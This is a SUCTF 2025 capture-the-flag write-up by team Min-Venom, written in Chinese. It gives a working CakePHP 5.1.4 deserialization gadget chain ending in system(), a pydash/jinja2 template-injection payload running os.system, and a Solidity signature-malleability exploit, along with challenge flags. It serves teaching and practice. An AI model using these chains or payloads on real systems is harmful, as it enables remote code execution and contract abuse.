---
title: SUCTF 2025 writeup by Min-Venom
contest: SUCTF
year: 2025
team: Min-Venom
difficulty: medium
vuln_type: web_unknown
tags: [cakephp-5.1.4, php-unserialize, jinja2-pydash, prototype-pollution, secp256k1, signature-malleability, solana-onchain]
attack_chain:
- cakephp 5.1.4 加 __wakeup 限制，重新找入口
- src/Internal/RejectedPromise.__destruct 拼接 reason 字符串
- PHPStan\PhpDocParser\Ast\Type\ConstTypeNode.__toString 触发
- 调 constExpr.__call 间接转 Cake\ORM\Table.__call
- Table._behaviors BehaviorRegistry._methodMap = ['__tostring' => ['MockClass', 'generate']]
- MockClass.generate() eval(classCode) call_user_func(MOCK '__phpunit_initConfigurableMethods', ...configurableMethods)
- 构造 classCode = "system('find /etc/passwd -exec tac /flag.txt ;')"
- 序列化：RejectedPromise.reason = ConstTypeNode.constExpr = Table()
- SU_blog: file 参数目录穿越读源码 + pydash jinja2 模板 RCE
- 通过 __init__.__globals__.sys.modules.jinja2.runtime.exported[2] 注入
- "*;import os;os.system('/read* >/tmp/gaoren.txt')" 利用 2 分钟容器窗口写文件
- SU_BBRE: 9 字节 data[i]+i 加密 + RC4 密钥 "suctf" 拼接 func1 地址 (栈溢出劫持)
- Onchain Magician: secp256k1 签名延展性 v=28 与 v=27 + s' = n - s
- two signatures same signer but different signatureHash bypass
- real_checkin: emoji 英文首字母拼 suctf{welcome_to_suctf_you_can_really_dance}
- Onchain Checkin: Solana program address + Solana explorer 查 base58 公钥
key_payload: signature2 = (27, r, n - s)
one_liner: SUCTF 2025 Min-Venom：cakephp 5.1.4 新链 (RejectedPromise→ConstTypeNode→Table→MockClass) + pydash jinja2 + secp256k1 签名延展性。
lesson: 椭圆曲线签名天然有两个 s 值，签名 hash 比较是常见绕过点。
quality: high
---
# SUCTF 2025 writeup by Min-Venom (ChaMd5 Venom 招新题)

## 1. SU_POP（cakephp 5.1.4 新链）
旧链因 __wakeup() 限制失效，Min-Venom 团队找到新入口：
- `src/Internal/RejectedPromise::__destruct` 拼接 `$this->reason` → 触发 `__toString`
- `PHPStan\PhpDocParser\Ast\Type\ConstTypeNode::__toString` → 调 `$this->constExpr->__call()`
- `Cake\ORM\Table::__call` 间接转 `Cake\ORM\BehaviorRegistry::call`
- `Table._behaviors` 中 `_methodMap = ['__tostring' => ['MockClass', 'generate']]`
- `PHPUnit\Framework\MockObject\Generator\MockClass::generate()` 中 `eval($this->classCode)`
- `classCode = "system('find /etc/passwd -exec tac /flag.txt ;');"`

完整链子（多 namespace）：
```php
namespace PHPUnit\Framework\MockObject\Generator;
final class MockClass { public $mockName = "MockClass"; public $classCode = "system(...)"; }

namespace Cake\ORM;
class Table {
    public BehaviorRegistry $_behaviors;
    public function __construct() {
        $a = new MockClass();
        $this->_behaviors = new BehaviorRegistry();
        $this->_behaviors->_methodMap = ["__tostring" => ["MockClass", "generate"]];
        $this->_behaviors->_loaded = ["MockClass" => $a];
    }
}

namespace React\Promise\Internal;
final class RejectedPromise { public $reason; }

namespace PHPStan\PhpDocParser\Ast\Type;
class ConstTypeNode { public $constExpr; }

$pop = new RejectedPromise();
$pop->reason = new ConstTypeNode();
$pop->reason->constExpr = new Table();
echo base64_encode(serialize($pop));
```

## 2. SU_blog
- 登陆后 file 参数可目录穿越
- 读 `waf.py` 看限制
- pydash 原型链污染 + jinja2 runtime.exported RCE
```json
{"key": ".__init__.__globals__.t.NamedTuple.__globals__.sys.modules.jinja2.runtime.exported[2]",
 "value": "*;import os;os.system('/read* >/tmp/gaoren.txt')"}
```
2 分钟容器窗口，多次访问页面触发 jinja 编译。

## 3. SU_BBRE
- 9 字节 `data[i] + i` 加密 → `AndPWNT00`
- RC4 密钥 `"suctf"` 还原 func2
- 中间夹 func1 目标地址 (栈溢出劫持控制流)
- flag = `SUCTF{We1com3ToReWorld="@AndPWNT00}`

## 4. Onchain Magician - 签名延展性攻击
- secp256k1 阶 n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
- 对每个签名 `(r, s)` 存在另一合法 `(r, n-s)` 配合 `v` 27/28 互换
- signIn(sig1) + openBox(sig2) 同一 signer 但 signatureHash 不同
```solidity
MagicBox.Signature memory signature1 = MagicBox.Signature(28, r, s);
MagicBox.Signature memory signature2 = MagicBox.Signature(27, r, bytes32(n - uint256(s)));
target.signIn(signature1);
target.openBox(signature2);
```
- flag: `SUCTF{C0n9r4ts!Y0u're_An_0ut5taNd1ng_OnchA1n_Ma9ic1an.}`

## 5. real_checkin
emoji 英文首字母：`🐍☂️🐈🌮🍟` = `suctf`，延伸得到 `suctf{welcome_to_suctf_you_can_really_dance}`

## 6. Onchain Checkin (Solana)
- Solana program address
- 在 explorer 查 account 公钥
- base58 编码 account3 拼起来
